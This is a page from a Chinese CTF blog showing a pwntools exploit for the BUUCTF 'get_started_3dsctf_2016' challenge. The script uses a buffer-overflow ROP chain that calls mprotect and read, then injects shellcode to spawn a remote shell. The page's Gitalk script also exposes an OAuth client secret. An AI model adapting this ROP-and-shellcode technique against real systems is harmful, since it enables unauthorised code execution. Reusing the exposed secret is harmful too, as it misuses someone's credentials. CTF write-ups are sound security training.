<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28576</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop esi</span></span><br><span class="line"><span class="string">pop edi</span></span><br><span class="line"><span class="string">pop ebp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * <span class="number">0x38</span></span><br><span class="line">payload_01 += p32(mprotect_addr)</span><br><span class="line">payload_01 += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload_01 += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload_01 += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数</span></span><br><span class="line">payload_01 += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload_01 += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#执行完read后ret esi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/31/buuctf/" data-id="ck63finkt0005rolucbgk6565"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  
    
  <nav class="article-nav">
    
    
      <a href="/2020/01/30/%E5%A0%86%E6%BA%A2%E5%87%BA/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">堆溢出</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">

  
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

  
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>

  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '665e1db541e975225bc6',
      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
      repo: 'talk',
      owner: 'summerN',
      admin: ['summerN'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 summerN&#39;s blog</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/gallery">Gallery</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="Search">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


  
<script src="/fancybox/jquery.fancybox.min.js"></script>




  
<script src="/js/tocbot.min.js"></script>

  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>



<script src="/js/ocean.js"></script>


</body>
</html>